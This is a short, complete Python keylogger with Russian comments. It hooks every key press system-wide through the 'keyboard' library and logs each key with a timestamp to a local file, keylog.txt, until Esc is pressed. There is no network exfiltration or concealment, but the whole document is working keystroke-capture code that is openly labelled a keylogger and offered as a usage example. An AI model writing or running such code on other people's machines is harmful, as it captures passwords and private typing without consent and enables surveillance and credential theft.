import logging
import keyboard

# Настройка логирования
log_file = 'keylog.txt'  # Имя файла для записи логов

# Настройка базового конфигурации логирования
logging.basicConfig(
    filename=log_file,  # Файл для записи логов
    level=logging.DEBUG,  # Уровень логирования
    format='%(asctime)s - %(message)s',  # Формат записи
    encoding='utf-8'  # Установка кодировки UTF-8
)

def log_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:  # Записываем только нажатия клавиш
        logging.info(f'Нажата клавиша: {event.name}')  # Логируем нажатую клавишу

# Пример использования
if __name__ == "__main__":
    logging.info("Кейлоггер запущен.")  # Сообщение о запуске кейлоггера
    
    # Начинаем слушать нажатия клавиш
    keyboard.hook(log_key_event)  # Подключаем обработчик событий клавиатуры
    keyboard.wait('esc')  # Ждем, пока не будет нажата клавиша Esc

    logging.info("Кейлоггер завершен.")  # Сообщение о завершении кейлоггера